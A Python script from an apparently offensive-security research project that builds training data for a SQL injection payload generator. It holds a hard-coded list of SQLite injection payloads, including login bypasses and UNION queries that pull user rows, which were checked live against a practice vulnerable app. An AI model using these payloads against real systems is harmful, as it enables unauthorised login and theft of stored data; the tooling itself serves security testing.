#!/usr/bin/env python
"""Generate targeted SQLite-dialect SQLi training pairs.

The model learned MySQL-flavored payloads from MySQL-heavy corpora
('#' comments, FLOOR-based errors) that fail on real SQLite backends
(proven live against OWASP Juice Shop: 0/6 payloads, while '--' variants
worked). This script mines SQLite-valid payloads through the FIXED
oracle (syntax errors no longer count as fires), then appends them to
pairs_raw.jsonl (3x duplication, XSS-playbook ratio) for the next
training run.

Usage (from sqli-ai/, light venv):
    python scripts/gen_sqlite_targeted.py            # generate + report
    python scripts/gen_sqlite_targeted.py --apply    # append to pairs_raw.jsonl
"""
from __future__ import annotations

import argparse
import json
import sys
import uuid
from datetime import UTC, datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

import yaml
from sqli_ai.context import ContextSpec
from sqli_ai.oracle.check_fires import check_fires

# SQLite-valid payload candidates, grouped by target context id.
# SQLite dialect rules: '--' and /* */ comments only, no '#',
# no FLOOR()/extractvalue()/updatexml(), sqlite_version() not version().
CANDIDATES: dict[str, list[str]] = {
    "sqli-string-plain": [
        "' OR 1=1--",
        "' OR '1'='1' --",
        "' OR 1=1 /*",
        "admin'--",
        "' OR EXISTS(SELECT 1)--",
        "' OR (SELECT 1)=1--",
        "' OR 1=1 AND ''='",
        "' AND 1=1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT sqlite_version(),2--",
        "' UNION SELECT id,name FROM users--",
        "' UNION SELECT 1,sqlite_version()--",
        "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1--",
        "' OR 'a'='a' '--",
        "' || '1'='1'--",
        "' OR substr('abc',1,1)='a'--",
        "' OR length('ab')=2--",
        "' OR 1=1;--",
        "' UNION ALL SELECT 1,2--",
        "' OR 2>1--",
    ],
    "sqli-string-escape-quotes": [
        # escaping doubles quotes — breakout via backslash is not possible
        # in SQLite; these verify as blocked (kept out by the oracle)
    ],
    "sqli-numeric-plain": [
        "1 OR 1=1--",
        "1 OR 1=1 /*",
        "1 UNION SELECT 1,sqlite_version()--",
        "1 UNION SELECT id,name FROM users--",
        "1 OR EXISTS(SELECT 1)--",
        "1 AND 1=1--",
        "0 OR 1=1--",
        "1 OR 2>1--",
        "(SELECT 1) OR 1=1--",
        "1 UNION ALL SELECT 1,2--",
    ],
    "sqli-orderby-plain": [
        "1--",
        "(SELECT 1)--",
        "name--",
        "id,(SELECT 1)--",
        "1,(SELECT sqlite_version())--",
    ],
}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--apply", action="store_true",
                    help="append verified pairs (3x) to pairs_raw.jsonl")
    args = ap.parse_args()

    contexts = {}
    data = yaml.safe_load(
        (ROOT / "data" / "contexts" / "sqli_contexts.yaml").read_text("utf-8"))
    for entry in data["contexts"]:
        contexts[entry["id"]] = entry

    verified: list[dict] = []
    print(f"{'CTX':28} {'FIRES':6} PAYLOAD")
    for ctx_id, payloads in CANDIDATES.items():
        spec = contexts.get(ctx_id)
        if not spec:
            print(f"{ctx_id}: unknown context, skipped")
            continue
        ctx = ContextSpec(id=spec["id"], location=spec["location"],
                          filters=spec.get("filters", []))
        for payload in payloads:
            fires = check_fires(ctx, payload)
            print(f"{ctx_id:28} {fires!s:6} {payload}")
            if fires:
                verified.append((ctx_id, spec, payload))

    print(f"\nverified: {len(verified)} payloads "
          f"(of {sum(len(v) for v in CANDIDATES.values())} candidates)")

    if not args.apply:
        print("dry run — rerun with --apply to append to pairs_raw.jsonl")
        return 0

    now = datetime.now(UTC).isoformat()
    raw_path = ROOT / "data" / "pairs" / "pairs_raw.jsonl"
    with raw_path.open("a", encoding="utf-8") as fh:
        for ctx_id, spec, payload in verified:
            pair = {
                "id": f"{ctx_id}__sqlite-{uuid.uuid4().hex[:8]}",
                "context": {
                    "id": ctx_id, "location": spec["location"],
                    "filters": spec.get("filters", []),
                    "dialect": "sqlite",
                    "description": spec.get("description", ""),
                },
                "payload": payload,
                "provenance": {
                    "source": "sqlite_targeted",
                    "verified_by": "oracle_sqlite_fixed",
                    "verified_at": now,
                    "note": "targeted SQLite dialect after Juice Shop live test",
                },
            }
            for _ in range(3):  # duplication ratio per XSS playbook
                fh.write(json.dumps(pair) + "\n")
    print(f"appended {len(verified) * 3} lines (3x duplication) to {raw_path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
